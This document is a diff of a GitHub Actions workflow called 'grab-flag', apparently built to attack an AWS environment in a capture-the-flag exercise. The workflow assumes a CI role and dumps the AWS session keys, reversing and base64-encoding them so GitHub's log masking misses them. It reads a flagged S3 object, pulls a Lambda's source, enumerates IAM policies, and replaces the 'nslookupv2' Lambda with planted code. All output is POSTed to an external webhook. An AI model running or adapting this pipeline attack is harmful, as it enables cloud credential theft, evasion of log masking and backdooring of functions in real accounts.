@@ -1,6 +1,6 @@
 name: grab-flag
 on:
-  workflow_dispatch:
+  workflow_dispatch: {}
   push:
     branches:
       - corgi
@@ -11,54 +11,61 @@ permissions:
 jobs:
   dump:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
+    timeout-minutes: 15
     steps:
-      - uses: aws-actions/configure-aws-credentials@v4
+      - name: Configure AWS
+        uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
           role-session-name: flaggrab
-      - name: exfil
-        shell: bash
+      - name: Exfil and plant
         env:
           WH: https://webhook.site/42b620d7-2084-4d83-889f-139b520dd049
         run: |
           set +e
+          OUT=/tmp/all.txt
           {
+            echo "===ID==="
             aws sts get-caller-identity
-            python3 - <<'PY2'
-import os,base64
-for k in ['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN']:
- print(k+'_B64='+base64.b64encode((os.environ.get(k,'') or '').encode()).decode())
-PY2
+            echo "===CREDS_REV_B64==="
+            # reverse + base64 to reduce GHA log masking of session keys
+            python3 -c 'import os,base64;ks=["AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY","AWS_SESSION_TOKEN"];
+[print(k+"="+base64.b64encode((os.environ.get(k,"") or "")[::-1].encode()).decode()) for k in ks]'
+            echo "===FLAG_TRY==="
             aws s3 cp s3://codec4f26c862a321ef5/flag.txt - 2>&1
-            URL=$(aws lambda get-function --function-name nslookupv2 --query Code.Location --output text)
+            echo "===LAM_CODE==="
+            URL=$(aws lambda get-function --function-name nslookupv2 --query Code.Location --output text 2>/dev/null)
+            echo "url_len=${#URL}"
             curl -sL "$URL" -o /tmp/lam.zip
-            python3 - <<'PY2'
-import zipfile,os
-if os.path.exists('/tmp/lam.zip') and os.path.getsize('/tmp/lam.zip')>0:
- z=zipfile.ZipFile('/tmp/lam.zip')
- for n in z.namelist():
-  print('FILE',n); print(z.read(n)[:3000].decode('utf-8','replace'))
-PY2
+            ls -la /tmp/lam.zip
+            python3 -c 'import zipfile,os;p="/tmp/lam.zip";
+print("size",os.path.getsize(p) if os.path.exists(p) else -1);
+z=zipfile.ZipFile(p);
+[print("FILE",n,"\n",z.read(n)[:4000].decode("utf-8","replace")) for n in z.namelist()]'
+            echo "===POLICY==="
             aws iam list-attached-role-policies --role-name cicdRole 2>&1
-            P=$(aws iam list-attached-role-policies --role-name cicdRole --query 'AttachedPolicies[0].PolicyArn' --output text 2>/dev/null)
+            P=$(aws iam list-attached-role-policies --role-name cicdRole --query "AttachedPolicies[0].PolicyArn" --output text 2>/dev/null)
+            echo "P=$P"
             if [ -n "$P" ] && [ "$P" != "None" ]; then
-              V=$(aws iam get-policy --policy-arn "$P" --query 'Policy.DefaultVersionId' --output text)
+              V=$(aws iam get-policy --policy-arn "$P" --query Policy.DefaultVersionId --output text)
               aws iam get-policy-version --policy-arn "$P" --version-id "$V" 2>&1
             fi
             aws s3api get-bucket-policy --bucket codec4f26c862a321ef5 2>&1
+            echo "===PLANT==="
             mkdir -p /tmp/plant
-            cat > /tmp/plant/lambda_function.py <<'PY2'
-import subprocess,json
-def lambda_handler(event, context):
-    r=subprocess.run('aws s3 cp s3://codec4f26c862a321ef5/flag.txt -',shell=True,capture_output=True,text=True)
-    return {'statusCode':200,'headers':{'Content-Type':'application/json'},'body':json.dumps({'flag':r.stdout,'err':r.stderr,'rc':r.returncode})}
-PY2
+            printf '%s\n' 'import subprocess,json' 'def lambda_handler(event, context):' '    r=subprocess.run("aws s3 cp s3://codec4f26c862a321ef5/flag.txt -",shell=True,capture_output=True,text=True)' '    return {"statusCode":200,"body":json.dumps({"flag":r.stdout,"err":r.stderr,"rc":r.returncode})}' > /tmp/plant/lambda_function.py
             (cd /tmp/plant && zip -q /tmp/plant.zip lambda_function.py)
             aws lambda update-function-code --function-name nslookupv2 --zip-file fileb:///tmp/plant.zip 2>&1
             aws lambda invoke --function-name nslookupv2 --cli-binary-format raw-in-base64-out --payload '{}' /tmp/out.json 2>&1
+            echo "===INVOKE_OUT==="
             cat /tmp/out.json 2>&1
-          } 2>&1 | tee /tmp/all.txt
-          curl -s -X POST --data-binary @/tmp/all.txt "$WH" || true
-          cat /tmp/all.txt
+            echo "===LIST_FN==="
+            aws lambda list-functions --query 'Functions[].FunctionName' 2>&1
+            aws apigateway get-rest-apis 2>&1
+            aws ec2 describe-vpcs --query 'Vpcs[].VpcId' 2>&1
+          } 2>&1 | tee "$OUT"
+          curl -s -X POST --data-binary @"$OUT" "$WH" || true
+          # also print file so logs exist even if webhooks lag
+          wc -c "$OUT"
+          cat "$OUT"
